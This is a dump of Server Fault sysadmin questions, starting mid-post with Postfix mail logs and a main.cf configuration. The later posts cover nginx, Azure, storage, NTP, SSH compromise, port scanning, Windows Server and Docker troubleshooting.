Aug 13 11:08:26 server1 postfix/smtpd[9261]: disconnect from localhost[::1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
Aug 13 11:08:26 server1 dovecot: imap(admin@dkict.com): Logged out in=472 out=640
Aug 13 11:08:26 server1 dovecot: imap-login: Login: user=&lt;admin@dkict.com&gt;, method=PLAIN, rip=::1, lip=::1, mpid=9269, secured, session=&lt;H1Kb455WqOI$
Aug 13 11:08:27 server1 dovecot: imap(admin@dkict.com): Logged out in=70 out=633
Aug 13 11:08:30 server1 postfix/smtpd[9270]: connect from localhost.localdomain[127.0.0.1]
Aug 13 11:08:30 server1 postfix/smtpd[9270]: 8C5C54625DB: client=localhost.localdomain[127.0.0.1]
Aug 13 11:08:30 server1 postfix/cleanup[9262]: 8C5C54625DB: message-id=&lt;8d024ea696db4366e8d63e9f629bc680@dkict.com&gt;
Aug 13 11:08:30 server1 postfix/qmgr[6091]: 8C5C54625DB: from=&lt;admin@dkict.com&gt;, size=1042, nrcpt=1 (queue active)
Aug 13 11:08:30 server1 amavis[3182]: (03182-07) Passed CLEAN {RelayedOutbound}, ORIGINATING LOCAL [::1]:33772 &lt;admin@dkict.com&gt; -&gt; &lt;tiger-dennis@ho$
Aug 13 11:08:30 server1 postfix/smtp[9263]: 7D8B246021F: to=&lt;tiger-dennis@hotmail.com&gt;, relay=127.0.0.1[127.0.0.1]:10026, delay=5.3, delays=0.25/0.0$
Aug 13 11:08:30 server1 postfix/qmgr[6091]: 7D8B246021F: removed
Aug 13 11:08:30 server1 postfix/smtpd[9270]: disconnect from localhost.localdomain[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
Aug 13 11:08:32 server1 dovecot: imap-login: Login: user=&lt;admin@dkict.com&gt;, method=PLAIN, rip=::1, lip=::1, mpid=9280, secured, session=&lt;ayPp455WruI$
Aug 13 11:08:32 server1 dovecot: imap-login: Login: user=&lt;admin@dkict.com&gt;, method=PLAIN, rip=::1, lip=::1, mpid=9281, secured, session=&lt;lzHp455WsOI$
Aug 13 11:08:32 server1 dovecot: imap(admin@dkict.com): Logged out in=120 out=766
Aug 13 11:08:32 server1 dovecot: imap(admin@dkict.com): Logged out in=318 out=1951
Aug 13 11:09:03 server1 postfix/smtp[9260]: connect to mx3.hotmail.com[65.55.92.168]:25: Connection timed out
Aug 13 11:09:08 server1 postfix/smtp[9259]: connect to gmail-smtp-in.l.google.com[173.194.69.26]:25: Connection timed out
Aug 13 11:09:08 server1 postfix/smtp[9259]: connect to gmail-smtp-in.l.google.com[2a00:1450:4013:c04::1b]:25: Network is unreachable
Aug 13 11:09:08 server1 postfix/smtp[9259]: connect to alt1.gmail-smtp-in.l.google.com[2404:6800:4003:c03::1b]:25: Network is unreachable
Aug 13 11:09:08 server1 postfix/smtp[9258]: connect to gmail-smtp-in.l.google.com[173.194.69.26]:25: Connection timed out
</code></pre>

<p>My main.cf:</p>

<pre><code># See /usr/share/postfix/main.cf.dist for a commented, more complete version


# Debian specific:  Specifying a file name will cause the first
# line of that file to be used as the name.  The Debian default
# is /etc/mailname.
#myorigin = /etc/mailname

smtpd_banner = $myhostname ESMTP $mail_name (Debian/GNU)
biff = no

# appending .domain is the MUA's job.
append_dot_mydomain = no

# Uncomment the next line to generate ""delayed mail"" warnings
#delay_warning_time = 4h

readme_directory = /usr/share/doc/postfix

# See http://www.postfix.org/COMPATIBILITY_README.html -- default to 2 on
# fresh installs.
compatibility_level = 2

# TLS parameters
smtpd_tls_cert_file = /etc/postfix/smtpd.cert
smtpd_tls_key_file = /etc/postfix/smtpd.key
smtpd_use_tls = yes
smtpd_tls_session_cache_database = btree:${data_directory}/smtpd_scache
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache

# See /usr/share/doc/postfix/TLS_README.gz in the postfix-doc package for
# information on enabling SSL in the smtp client.

smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination
myhostname = server1.dkict.com
alias_maps = hash:/etc/aliases, hash:/var/lib/mailman/data/aliases
alias_database = hash:/etc/aliases, hash:/var/lib/mailman/data/aliases
myorigin = /etc/mailname
mydestination =
relayhost =
mynetworks = localhost

mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = all
inet_protocols = all
html_directory = /usr/share/doc/postfix/html
virtual_alias_domains =
virtual_alias_maps = hash:/var/lib/mailman/data/virtual-mailman, proxy:mysql:/etc/postfix/mysql-virtual_forwardings.cf, proxy:mysql:/etc/postfix/mysql-virtual_email2email.cf
virtual_mailbox_domains = proxy:mysql:/etc/postfix/mysql-virtual_domains.cf
virtual_mailbox_maps = proxy:mysql:/etc/postfix/mysql-virtual_mailboxes.cf
virtual_mailbox_base = /var/vmail
virtual_uid_maps = mysql:/etc/postfix/mysql-virtual_uids.cf
virtual_gid_maps = mysql:/etc/postfix/mysql-virtual_gids.cf
sender_bcc_maps = proxy:mysql:/etc/postfix/mysql-virtual_outgoing_bcc.cf
smtpd_sasl_auth_enable = yes
broken_sasl_auth_clients = yes
smtpd_sasl_authenticated_header = yes
smtpd_restriction_classes = greylisting
greylisting = check_policy_service inet:127.0.0.1:10023
smtpd_recipient_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination, reject_rbl_client zen.spamhaus.org, check_recipient_access mysql:/etc/postfix/mysql-virtual_recipient.cf, check_recipient_access mysql:/etc/postfix/mysql-virtual_policy_greylist.cf
smtpd_tls_security_level = may
transport_maps = hash:/var/lib/mailman/data/transport-mailman, proxy:mysql:/etc/postfix/mysql-virtual_transports.cf
relay_domains = mysql:/etc/postfix/mysql-virtual_relaydomains.cf
relay_recipient_maps = mysql:/etc/postfix/mysql-virtual_relayrecipientmaps.cf
smtpd_sender_login_maps = proxy:mysql:/etc/postfix/mysql-virtual_sender_login_maps.cf
proxy_read_maps = $local_recipient_maps $mydestination $virtual_alias_maps $virtual_alias_domains $sender_bcc_maps $virtual_mailbox_maps $virtual_mailbox_domains $relay_recipient_maps $relay_domains $canonical_maps $sender_canonical_maps $recipient_canonical_maps $relocated_maps $transport_maps $mynetworks $smtpd_sender_login_maps
smtpd_helo_required = yes
smtpd_helo_restrictions = permit_sasl_authenticated, permit_mynetworks, check_helo_access regexp:/etc/postfix/helo_access, reject_invalid_hostname, reject_non_fqdn_hostname, reject_invalid_helo_hostname, reject_unknown_helo_hostname, check_helo_access regexp:/etc/postfix/blacklist_helo
smtpd_sender_restrictions = check_sender_access regexp:/etc/postfix/tag_as_originating.re , permit_mynetworks, permit_sasl_authenticated, check_sender_access mysql:/etc/postfix/mysql-virtual_sender.cf, check_sender_access regexp:/etc/postfix/tag_as_foreign.re
smtpd_client_restrictions = check_client_access mysql:/etc/postfix/mysql-virtual_client.cf
smtpd_client_message_rate_limit = 100
maildrop_destination_concurrency_limit = 1
maildrop_destination_recipient_limit = 1
virtual_transport = dovecot
header_checks = regexp:/etc/postfix/header_checks
mime_header_checks = regexp:/etc/postfix/mime_header_checks
nested_header_checks = regexp:/etc/postfix/nested_header_checks
body_checks = regexp:/etc/postfix/body_checks
owner_request_special = no
smtp_tls_security_level = may
smtpd_tls_mandatory_protocols = !SSLv2, !SSLv3
smtpd_tls_protocols = !SSLv2,!SSLv3
smtp_tls_protocols = !SSLv2,!SSLv3
smtpd_tls_exclude_ciphers = RC4, aNULL
smtp_tls_exclude_ciphers = RC4, aNULL
dovecot_destination_recipient_limit = 1
smtpd_sasl_type = dovecot
smtpd_sasl_path = private/auth
content_filter = amavis:[127.0.0.1]:10024
receive_override_options = no_address_mappings
message_size_limit = 0
</code></pre>

<p>Thanks in common! </p>
","<debian><postfix><dovecot><debian-stretch>","2017-08-14 10:23:56"
"988975","Nginx strip part of request uri","<p>I have a scenario</p>

<pre><code>location / {

# If the request_uri is /a/b/c 
# then proxy_pass http://upstream/c

}
</code></pre>

<p>Please help me out with any suggestions.
I saw this <a href=""https://serverfault.com/questions/718610/how-to-modify-uri-to-part-of-uri-from-request-uri-in-nginx"">post</a> , but the solution doesn't work for me.</p>
","<nginx>","2019-10-22 14:37:09"
"947385","BitSight discovered Azure staging instance","<p>We had a company run BitSight against us.</p>

<p>They found a website with an expired certificate and only supplied us with an IP address.</p>

<p>We looked into Azure and found that it was a staging instance of a Cloud Service.</p>

<p>We didn't link back to that URL anywhere. We also didn't expose the IP to anyone, and it was able to detect the site even after the IP changed.</p>

<p>Staging urls are https://{GUID}.cloudapp.net , so you can't really guess that.</p>

<p>How is this even possible without them having some inside knowledge of Azure or some kind of exploit?</p>
","<azure>","2019-01-02 21:10:24"
"868590","Expandable Storage","<p>I am developing a web application service and am looking to scale our internal servers. </p>

<p>Our current server has ~1TB of storage capacity. Users create ~10gb of data which is added to our database daily.</p>

<p>As you can see at our current rate, we would only be able to sustain this storage growth for ~100 days. We do not expect the rate of data creation to slow in the near future. Due to the nature of the information we are not looking to use commercial cloud storage (aws, google, microsoft, softlayer etc.)</p>

<p>We would like to build a server infrastructure that can be continually expanded (beyond the limits of 100TB). This would be a gradual process as needed, and would span multiple 4U server racks.</p>

<p>My question is that what would be the standard way to do this without over-complicating our software.
I have looked into ZFS and openNAS, but there seems to be limitations with pooling and continually expanding storage. </p>

<p>What is the best way to build a homogenous storage architecture that can be continually expanded to support our storage needs?</p>
","<storage><database><zfs>","2017-08-14 17:44:16"
"947414","How to make nginx to send early data in POST method","<p>I am testing TLS 1.3 and 0 RTT in a local nginx web server. </p>

<p>It works fine with <code>GET</code> methods. But when I use <code>POST</code> methods to send early data, it does not succeed. I think the cause is the ngnix server. I want to know how to enable nginx to support <code>POST</code> methods with early data.</p>
","<ssl><nginx>","2018-12-30 14:35:55"
"776768","robocopy cannot find path","<p>i have batch script like bellow:</p>

<pre><code>SET SOURCE=F:\Diff\For_VOYAGE\models.pck.files\models\players
SET DESTINATION=F:\Diff\For_VOYAGE\models.pck.files\NEW\models\players
SET LOG=LOG.txt
robocopy %SOURCE%\装备\女\印度舞娘时装上衣 %DESTINATION%\装备\女\印度舞娘时装上衣 /E /LOG+:%LOG%</code></pre>

<p>when i execute it, giving me error like bellow:</p>

<pre><code>
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows     ::     Version XP010
-------------------------------------------------------------------------------

  Started : Sat May 14 20:27:50 2016

   Source : F:\Diff\For_VOYAGE\models.pck.files\models\players\装备\女\印度舞娘时装上衣\
     Dest : F:\Diff\For_VOYAGE\models.pck.files\NEW\models\players\装备\女\印度舞娘时装上衣\

    Files : *.*

  Options : *.* /S /E /COPY:DAT /R:1000000 /W:30 

------------------------------------------------------------------------------

2016/05/14 20:27:50 ERROR 3 (0x00000003) Accessing Source Directory F:\Diff\For_VOYAGE\models.pck.files\models\players\装备\女\印度舞娘时装上衣\
The system cannot find the path specified.

</code></pre>

<p>I have check path <pre><code>F:\Diff\For_VOYAGE\models.pck.files\models\players\装备\女\印度舞娘时装上衣\</code></pre>
I can access it from windows explorer.
but seems the command prompt can't read it.
does anyone have this problem before?
Thank you.</p>
","<batch><windows-command-prompt><robocopy><command>","2016-05-14 13:36:13"
"947449","Rsync on mounted google drive","<p>I have mounted my google drive in ubuntu nad want to rsync my pictures.</p>

<p>I issue the command</p>

<pre><code>rsync -Parvhz folder1 /home/me/GoogleDrive/Pictures/
</code></pre>

<p>it transfer them all. Then I re-issue the command and it again sends the whole files, though nothing has changed.</p>

<p>Isn't rsync suppose to transfer the diffs? Am I doing something wrong?</p>

<p>What I intended to do is run a cron job to rsync the whole 130GB folder to google drive every night since I rarely put photos in there. But if I have to upload again all files then we have a problem!</p>

<p>Thanks</p>
","<rsync><google-drive>","2019-01-03 10:56:22"
"989079","Nginx redirect users to another domain based on Client IP address","<p>I'm trying to redirect some users to another website based on their client IP address. For example if user is in range <code>192.168.0.0/24</code> they'd be redirected to another website.</p>

<p>I've found <a href=""https://www.scalescale.com/tips/nginx/redirect-nginx-traffic-client-ip/"" rel=""nofollow noreferrer"">this</a> article which mentions this method:</p>

<pre><code>server {
   if ($remote_addr = 1.2.3.4) {   ## Also will it work with subnet address like 192.168.0.0/24?
      rewrite ^ http://www.yourwebsite.com/otherpage.htm;
   }
}
</code></pre>

<p>I guess it would work fine. But how can I supply IP range list file into this <code>if</code> block? Including hundreds of IP address in single line wouldn't look good.</p>
","<nginx>","2019-10-23 08:57:45"
"776805","mpm_prefork values for 2-4 GB RAM","<p>I have bought new linode (1GB). </p>

<p>On this page :<a href=""https://www.linode.com/docs/websites/lamp/install-lamp-on-ubuntu-16-04"" rel=""nofollow noreferrer"">https://www.linode.com/docs/websites/lamp/install-lamp-on-ubuntu-16-04</a></p>

<p>Linode says:</p>

<blockquote>
  <p>Below are the suggested values for a 1GB Linode:</p>
</blockquote>

<p>File:<strong>/etc/apache2/mods-available/mpm_prefork.conf</strong></p>

<pre><code>&lt;IfModule mpm_prefork_module&gt;
        StartServers            2
        MinSpareServers         6
        MaxSpareServers         12
        MaxRequestWorkers       39
        MaxConnectionsPerChild  3000
&lt;/IfModule&gt;
</code></pre>

<p>But I'll plan to upgrade 2GB OR 4GB machine. What should be above values for 2GB or 4GB machine and WHY?</p>

<p>OS: Ubuntu 16.04 LTS</p>
","<ubuntu><performance><apache-2.4><mpm-prefork>","2016-05-14 19:48:20"
"776837","How to free some memory in Centos 7 with only VestaCP installed","<p>I recently bought a server. I have Centos 7 64-bit on it, with VestaCP installed (with one wordpress blog added).. Only these things are installed, nothing else as per my understanding.
However, my memory usage is already 50% (512mb out of 1024). Is that much VestaCP with a fresh installation of wordpress consumes? because I was told VestaCP is very light.</p>

<p>Sorry for offtopic, but my question is.. Is there anyway I can check what processes are being using my memory and which ones are just using memory and I am not using them..
I mean, How can I free some of the memory usage on Centos..</p>

<p>I'd appreciate any sort of help,
regards</p>
","<linux><centos>","2016-05-15 02:11:10"
"989167","Should I transfer my domain to AWS? AWS Route53 price vs GoDaddy","<p>I'm  thinking about transferring my domains from GoDaddy to AWS Route53.
But I'm a little confused about the pricing format of AWS.</p>

<p>In GoDaddy you just pay to register the domain name each year and then you don't have to pay anything else.</p>

<p>But in AWS after you pay for the domain each year (I think is like $12 for a .com) and it seems do you have to pay each time someone visits your website or tries to resolve the DNS to an IP?</p>

<p>If yes, is the cost the same in these 3 cases?
1) If the DNS is pointing to an EC2 instance
2) If its pointing to a static S3 hosted website
3) If its pointing to an IP address that is not in the AWS network.</p>

<p>I'm worried that after transferring my domain to AWS I will end up paying more depending on how many people visit my website.</p>

<p>Many thanks in advance!</p>
","<amazon-web-services><amazon-route53><godaddy>","2019-10-23 18:01:50"
"989176","Why is port 1028 deprecated?","<p>IANA <a href=""https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.txt"" rel=""noreferrer"">lists</a> port 1028 with the simple description ""Deprecated"". Hundreds of other ports are listed as ""Reserved"", and hundreds more as ""Unassigned"", but only one port has the description ""Deprecated"".</p>

<p>I'm trying to understand the difference between these three states, and would like to know what history led to port 1028 being in this unique state <a href=""https://www.speedguide.net/port.php?port=1028"" rel=""noreferrer"">as of February 2004</a>.</p>

<p>There appear to have been some <a href=""https://www.grc.com/port_1028.htm"" rel=""noreferrer"">security concerns</a> with the ports 1025-1029, but the other four ports haven't been deprecated and are currently assigned other roles.</p>
","<port>","2019-10-23 19:00:30"
"776920","What code can I add to my csgo server.cfg to have it only respond to one dns?","<p>Im trying to run multiple csgo servers on my server rack and I have diffrent domains that I want to use on each server because the port numbers need to stay the same. Im thinking of finding a line to add to my server.cfg to have host names (like in windows server with IIS were you can set the site to only respond on one url for each site)</p>
","<ubuntu><hostname>","2016-05-15 17:34:12"
"947676","cachefilesd systemd service failures","<pre><code>gentoolaptop / # systemctl status cachefilesd
● cachefilesd.service - Local network file caching management daemon
   Loaded: loaded (/lib/systemd/system/cachefilesd.service; enabled; vendor preset: disabled)
   Active: failed (Result: exit-code) since Fri 2019-01-04 19:01:42 CST; 4s ago
  Process: 11965 ExecStart=/sbin/cachefilesd -n -f /etc/cachefilesd.conf (code=exited, status=1/FAILURE)
  Process: 11964 ExecStartPre=/sbin/modprobe -qab cachefiles (code=exited, status=0/SUCCESS)
 Main PID: 11965 (code=exited, status=1/FAILURE)

Jan 04 19:01:42 gentoolaptop systemd[1]: Starting Local network file caching management daemon...
Jan 04 19:01:42 gentoolaptop systemd[1]: Started Local network file caching management daemon.
Jan 04 19:01:42 gentoolaptop cachefilesd[11965]: Can't confirm cache location: errno 2 (No such file or directory)
Jan 04 19:01:42 gentoolaptop systemd[1]: cachefilesd.service: Main process exited, code=exited, status=1/FAILURE
Jan 04 19:01:42 gentoolaptop systemd[1]: cachefilesd.service: Failed with result 'exit-code'.
</code></pre>

<p>The cache directory is set as /var/cache/fscache in cachefiles.conf:</p>

<pre><code>dir /var/cache/fscache
tag mycache
brun 10%
bcull 7%
bstop 3%
frun 10%
fcull 7%
fstop 3%

# Assuming you're using SELinux with the default security policy included in
# this package
#secctx system_u:system_r:cachefiles_kernel_t:s0
</code></pre>

<p>If I try to create that directory, the service fails with this issue:</p>

<pre><code>gentoolaptop / # systemctl status cachefilesd
● cachefilesd.service - Local network file caching management daemon
   Loaded: loaded (/lib/systemd/system/cachefilesd.service; enabled; vendor preset: disabled)
   Active: failed (Result: exit-code) since Fri 2019-01-04 17:04:52 CST; 1h 51min ago
  Process: 9679 ExecStart=/sbin/cachefilesd -n -f /etc/cachefilesd.conf (code=exited, status=1/FAILURE)
  Process: 9678 ExecStartPre=/sbin/modprobe -qab cachefiles (code=exited, status=0/SUCCESS)
 Main PID: 9679 (code=exited, status=1/FAILURE)

Jan 04 17:04:52 gentoolaptop systemd[1]: Starting Local network file caching management daemon...
Jan 04 17:04:52 gentoolaptop systemd[1]: Started Local network file caching management daemon.
Jan 04 17:04:52 gentoolaptop cachefilesd[9679]: About to bind cache
Jan 04 17:04:52 gentoolaptop systemd[1]: cachefilesd.service: Main process exited, code=exited, status=1/FAILURE
Jan 04 17:04:52 gentoolaptop cachefilesd[9679]: CacheFiles bind failed: errno 105 (No buffer space available)
Jan 04 17:04:52 gentoolaptop systemd[1]: cachefilesd.service: Failed with result 'exit-code'.
</code></pre>

<p>chmod 777 has no effect.</p>

<p>dmesg:</p>

<pre><code>[  924.197705] CacheFiles: mkdir cache failed with error -105
[  924.197708] CacheFiles: Failed to register: -105
</code></pre>

<p>fstab:</p>

<pre><code>gentooserver:/  /media/store    nfs4    rw,_netdev,noauto,user,lazytime,exec,sync,tcp,vers=4.1,fsc      0 0
</code></pre>
","<nfs><cache><systemd>","2019-01-05 01:14:22"
"776950","Can a '.org' be a subdomain of a '.com'?","<p>My site, perisys.com, is on a shared server. I have a number of .com subdomains that are invoked by entering the domain-name.com. For example, as xyz.com and not xyz.perisys.com.</p>

<p>However, I also have a domain-name.org that I'd like to invoke as if it were another domain-name.com.</p>

<p>Is that possible?</p>
","<subdomain>","2016-05-15 22:41:42"
"868747","How to determine if Linux OS is on virtual hardware or physical hardware?","<p>From a Linux OS, is there a way to determine if the OS is running as a guest OS on a virtualized VMware environment as opposed to running directly on non-virtualized/bare metal/physical host?  In my case it is either VMware or not, but I am also interested the more general question of whether the OS is on physical hardware or virtualized hardware of any sort.</p>
","<linux><virtualization>","2017-08-15 14:48:35"
"989281","Centos NTP time skew alerts","<p>I have a couple of NTP Stratum 2 servers, and these are in sync with a Stratum 1 GPS appliance, and also peered between them selves. I would be interested in creating a job, which will create an alert if the time difference between Stratum 1 and Stratum 2 goes off by X seconds etc.
I appreciate any help on this..</p>

<p>Thanks</p>
","<centos><centos7><ntp><time><time-synchronization>","2019-10-24 13:34:03"
"868791","How to use HAProxy with a wordpress site?","<p>I know how to setup HAProxy and get multiple backends to work together to balance the load. However, the problem remains, how to host WordPress (via nginx and MySQL) on such setup?</p>

<p>The problem is that if you install it in this way, you'll have multiple different backends. Say you instaleld a wordpress website on backend1, if you were redirected to backend2 and you created a new post, that post will be only in backend2, right? So we'll also need replication between the backends in order to serve the exact same content?</p>

<p>Am I missing something?</p>
","<nginx><haproxy><wordpress>","2017-08-15 18:10:01"
"868840","How to detect backdoor origin - ssh brute forced","<p>I've set up a little ARM server, running the latest version of armbian with kernel 4.11.6</p>

<p>I have Apache2:</p>

<pre><code>Server version: Apache/2.4.10 (Debian)
Server built:   Jul 18 2017 19:31:53
</code></pre>

<p>At home i'm using a cheap router Hawei HG8247H , with port forwarding active for port 80 and port 22 directing the incoming connections to the public IP, straight to the server inside the private network <code>192.168.1.114</code></p>

<p>At first i've set up the root user with an too easy of a password that i suspect, was cracked by brute forcing ssh login...</p>

<p>After some thought over the subject i altered the password, switching to a stronger one. My doubt is, was the system compromised to the point where a mere password change of root isn't enough anymore?</p>

<p>I ran the <code>netstat -pan</code>:</p>

<p><a href=""https://i.sstatic.net/eIZC6.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/eIZC6.png"" alt=""netstat -pan""></a></p>

<p>There's an abusive IP operating on my machine: 123.183.209.140; Probably serving as a spam zombie while i write this.</p>

<p>Also, ran nmap searching for vulnerabilities, yielding NOT VULNERABLE at least for the ones listed at the vulscan database to this day. </p>

<p>These high ports also seem suspicious. I feel uncanny with all the eerie movements on the server and the idea of a member of the internal network being compromised is scary as it is a trusted node of the internal network. Should somehow try to isolate the server in another separate network.</p>

<p>My doubt is, what is the next step to take from hereafter ?</p>

<p>Thank you for any advises.</p>
","<ssh><debian><apache-2.4>","2017-08-16 00:31:20"
"989385","Install gRPC php extension in elastic-beanstack","<p>I need to install gRPC php extension elastic-beanstack. The way i found is to write a config file inside "".ebextensions"" in order to automatically install the extension. For that I need to create yaml or json file. I need to add the following content in yaml/json file listed in the website below:</p>

<p><a href=""https://cloud.google.com/php/grpc"" rel=""nofollow noreferrer""> https://cloud.google.com/php/grpc</a></p>

<p>Can anyone help me to create yaml/json file in order to automate the process of extension installation?</p>

<p>Thanks!</p>
","<elastic-beanstalk><json><yaml>","2019-10-25 10:48:06"
"989406","MS turning off Basic Authentication for Exchange Online in 2020","<p>MS will be depricating basic auth on pop3 october 2020.</p>

<p>Does pop3 will continue to work after that?</p>

<p>Is it possible to use OAuth with a pop3 connection ?
I can't find any documentation on that.</p>
","<exchange><microsoft-office-365><pop3><office365><oauth>","2019-10-25 14:07:36"
"868904","Upgrade Windows Server when Exchange Installed","<p>I currently have Exchange 2010 installed on Windows Server 2008 R2 but would like to upgrade both the operating system (Windows Server 2012 R2 or Windows Server 2016) and Exchange (Exchange 2016).  I have read Microsoft does not support upgrading OS when Exchange is installed.  A further issue is that this server is also our main domain controller.</p>

<p>I know this is likely to be unsupported but has anyone tried this at all?</p>
","<windows-server-2008><exchange><windows-server-2016><exchange-migration>","2017-08-16 09:09:05"
"868905","Forward sent mails on port 25 to port 465 with firewall","<p>Our customer can not send emails to another company. The error says that the mail has been rejected because it is sending mails over an unsecured connection (<strong>port 25</strong>). So if the Exchange 2013 Server would send the mails over a secured connection (<strong>port 465</strong>) the mailserver on the other side would accept the mails.<br>
So my question is, if I would configure a DNAT on the Sophos firewall that would route all inside traffic from port 25 to port 465, may it be possible that the other companys server would accept the mail? <br>
Or do I have to reconfigure the Exchange server to send mails over a secured connection?</p>

<p>Many thanks in advance
Kind regards</p>
","<email><ssl><exchange>","2017-08-16 09:11:24"
"989502","My company uses forcepoint to snoop on its employees. Are my passwords safe?","<p>We have heard that the forcepoint SW running on all our companies corporate laptops decrypts all ssl traffic, including web pages and chat clients (skype, whatsapp, skype for business etc).</p>

<p>This implies that the companies It department have full access to everything, including our banking passwords, email passwords etc.  Not just which websites we visit (which I dont mind)</p>

<p>Could someone who knows what forcepoint can do explain how it works and what it can and cant see?</p>

<p>Interestingly, the local IT support guys blame forcepoint for the fact that performance for things like video conferencing using skype for business is so bad, and suggest using non-company laptops on guest networks for critical company calls, which seems crazy.</p>
","<security>","2019-10-26 18:45:04"
"989518","Router reboots when doing port-scanning","<p>I'm facing a problem similar to <a href=""https://security.stackexchange.com/questions/103505/router-reboots-when-using-nmap"">Router reboots when using Nmap</a>. To sum up, I'm doing port-scanning and once the rate is high enough the router reboots (just like described in the thread above using nmap). What I'm looking for is a solution to prevent the router from rebooting, while still keeping the scanning rate.</p>

<p>I've already tried to post this problem on security stackexchange, it was put on hold as off-topic <a href=""https://security.stackexchange.com/questions/220248/router-reboots-when-doing-port-scan"">Router reboots when doing port scan [on hold]
</a>. I hope this is the correct forum to ask this then.</p>

<p>Anyway I was advised there to include the router logs. My router - FRITZ!Box Fon WLAN 7360 (FRITZ!OS 06.30) - looses all the logs when doing a reboot. I've also tried my routers Push-Service to get the error logs before the reboot, but without success. So the only thing there is, is an error message after the reboot, but without any further information about the error itself :/.</p>

<p>The accepted answer for <a href=""https://security.stackexchange.com/questions/103505/router-reboots-when-using-nmap"">Router reboots when using Nmap</a> says</p>

<blockquote>
  <p>You are probably exhausting the router's resources, primarily the NAT table.</p>
</blockquote>

<p>I'm not an expert to this, but I was thinking that if I do port forwarding just like with an http server for port 80, but instead to it for port equal to the source port of the TCP probes I'm sending, it would solve this issue described in the answer there. But it does not help me, the router still reboots. Am I wrong in thinking that port forwarding can help with this issue, or does it mean that I have a different problem and how can I solve this?</p>

<p>BTW I'm using all kind of TCP SYN like scans and there is not a notable difference in terms or router rebooting behavior.</p>
","<router><port-forwarding><port-scanning>","2019-10-27 08:16:17"
"947950","LAMP stack with AWS performance","<p>I am planning to move my LAMP stack to AWS as the number of users increases. Current estimations suggest, that the Server has to handle roughly 100.000 users accessing the static landing page, out of which about 5.000 will use the internal pages (PHP and Database access). Can I use AWS to host my site and what should I pay attention to?</p>
","<mysql><php><amazon-web-services><lamp><high-load>","2019-01-07 16:54:19"
"868992","minimizing latency between two Azure VMs in the same region?","<p>I wonder - what is the best way to minimize latency between two VMs in Azure in the same region, VNET and Resource Group?</p>
","<azure>","2017-08-16 16:25:36"
"869075","how to get IP address list of Social Network","<p>I'm newbie sorry for my poor English </p>

<p>I want block range IP of Social networks and Game server in Mikrotik router . I need IPs of below social network :</p>

<ul>
<li><p>Telegram</p></li>
<li><p>Clash Of Clans</p></li>
<li><p>Instagram</p></li>
</ul>

<p>i google it before ask question here but i didn't find any trust-able information and guide-line .</p>
","<ip><mikrotik><ip-blocking>","2017-08-17 05:40:09"
"989625","Windows Server 2016 - How to change TCP Timeout settings on open port","<p>In Windows Server 2016:</p>

<ul>
<li><p>I ran a NodeJS application on port 8080 and made the port available to the public internet. (by allowing inbound TCP connections over the port 8080 in the firewall) </p></li>
<li><p>GET Request to <a href=""http://my.public.address:8080/hello"" rel=""nofollow noreferrer"">http://my.public.address:8080/hello</a>, and the response is good.</p></li>
<li><p>If the GET request takes more than 2 minutes, there is a timeout. In other words, the client doing the GET request, fails after 2 minutes. </p></li>
<li><p>To make the GET request, we're using postman with 0 as a request timeout (it will wait as long as it needs for the response), so I'm guessing Windows is returning an empty response, or closing the connection exactly after 2 minutes. Why?</p></li>
</ul>

<p>Is there a way to change the TCP connection timeout setting in Window Server 2016?</p>
","<windows><tcp><windows-server-2016><timeout><windows-firewall>","2019-10-28 10:15:00"
"948133","Update is not applicable to the equipment, Windows Server 2016","<p>I have problems to execute windows updates through independent windows installers.</p>

<p>The equipement show message that say: The update is not applicable in this equipement.</p>

<p>S.O Windows Server 2016</p>
","<windows><windows-server-2016><windows-update>","2019-01-08 19:46:16"
"777949","How cloud storage provider like google store and distinguish data of different users?","<p>My question is simple. How the cloud storage provider like google store data of different users on same server.
For example there are two user storing there data on a single drive on cloud. My question is how back-end system distinguish between these different user data saved on same hard drive, so that there is proper isolation between the data of these two users.</p>
","<storage><cloud>","2016-05-20 08:17:04"
"869141","Dell PowerEdge R610 with PERC6/i & Not certified hard drives","<p>A small company was bought server Dell POWEREDGE R610 used in the past.</p>

<p>In this server, a raid controller is installed PERC6/i</p>

<p>Naturally, the server was purchased without hard disks.</p>

<p>In all slots for hard drives were inserted hard drives of household class of the company HGST 7200RPM 1TB.</p>

<p>The problem is that the server actually works with this disks, create raids arrays and all that, but here's the information display of my server constantly writes that the disks are faulty, listing each compartment where the hard hard drive is located. Also, the indicator lights are constantly flashing orange.</p>

<p>I'm interested in who has encountered or just knows whether it is possible to connect another controller in this server, for example Adaptec firm or another one that can work with uncertified hard disks?</p>

<p>Or is there an opportunity to make this raid controller work with those disks that I have installed?</p>

<p>Also, please note that the raid controller itself is connected to the backplane. And how to be in case of replacing the raid controller, that is, you need to look for a raid counter with a backplane that will fit exactly to my server, or can any raid controller connect to this backplane and everything will work?</p>

<p>I still could not understand where the information about compatible hard disks is stored (protected), in the raid controller itself or in the backplane?</p>

<p>I thank all those who are not indifferent, who will respond to my help.
Thank you!
<a href=""https://drive.google.com/open?id=0B1GgipOR54o9bTJTNm1XV1VaeDg"" rel=""nofollow noreferrer"">https://drive.google.com/open?id=0B1GgipOR54o9bTJTNm1XV1VaeDg</a>
<a href=""https://drive.google.com/open?id=0B1GgipOR54o9dFptb2I0MGg0U2s"" rel=""nofollow noreferrer"">https://drive.google.com/open?id=0B1GgipOR54o9dFptb2I0MGg0U2s</a></p>
","<raid><dell><dell-poweredge>","2017-08-17 12:18:39"
"948195","Ubuntu 16.04 Docker CE not working ‘dependency job for docker.service failed’","<p>I hope this is the right place for my question.
I try to run docker on a Ubuntu vServer.</p>

<p>I installed docker ce according to the official documentation (<a href=""https://docs.docker.com/install/linux/docker-ce/ubuntu/#install-using-the-repository"" rel=""nofollow noreferrer"">https://docs.docker.com/install/linux/docker-ce/ubuntu/#install-using-the-repository</a>)</p>

<p>My OS</p>

<pre><code>DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION=""Ubuntu 16.04.5 LTS""
NAME=""Ubuntu""
